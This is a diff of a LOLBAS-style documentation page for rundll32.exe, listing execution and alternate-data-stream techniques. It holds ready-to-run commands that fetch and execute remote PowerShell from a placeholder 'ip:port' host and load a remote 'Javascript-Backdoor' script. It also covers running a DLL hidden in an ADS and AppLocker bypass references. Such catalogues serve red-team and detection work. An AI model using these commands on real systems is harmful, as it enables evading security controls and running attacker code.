@@ -31,8 +31,45 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Rundll32/#execute">Execute</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Rundll32/#ads">Alternate data streams</a></li>
+    
+</ul>
 
+<p>Used by Windows to execute dll files</p>
 
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\rundll32.exe</li>
+	
+	<li>c:\windows\sysWOW64\rundll32.ee</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/">https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/</a></li>
+	
+	<li><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7</a></li>
+	
+	<li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></li>
+	
+	<li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> <p>Thanks to Casey Smith - @subtee</p>
+
+<br>
 
 
 
@@ -46,38 +83,87 @@
 
 <ul class="examples">
 
-	
-    <li>
-        <h3>Name</h3>
-		<pre><code>Rundll32.exe</code></pre>
-        <h3>Commands</h3>
-        <pre><code>Command: rundll32.exe AllTheThingsx64,EntryPoint
-Description: Example command. AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.
-Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
-Description: Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.
-Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
-Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe.
-Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
-Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.
-Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
-Description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
-Command: rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain
-Description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).</code></pre>
-        <h3>Full Path</h3>
-        <pre><code>C:\Windows\System32\rundll32.exe C:\Windows\SysWOW64\rundll32.exe</code></pre>
-        <h3>Code Sample</h3>
-        <pre><code></code></pre>
-        <h3>Resources</h3>
-		<pre><code>https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
-https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
-https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md
-https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
-https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</code></pre>
-        <h3>Notes</h3>
-        <pre><code>Thanks to Casey Smith - @subtee</code></pre>
-    </li>
     
+
+
+
+    <li>
+        <p>AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.</p>
+
+        <pre><code>rundll32.exe AllTheThingsx64,EntryPoint</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.</p>
+
+        <pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Use Rundll32.exe to execute a JavaScript script that runs calc.exe.</p>
+
+        <pre><code>rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.</p>
+
+        <pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.</p>
+
+        <pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")</code></pre>
+    </li>
+
+    
+
 </ul>
+<br>
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).</p>
+
+        <pre><code>rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
 
 
         <script>
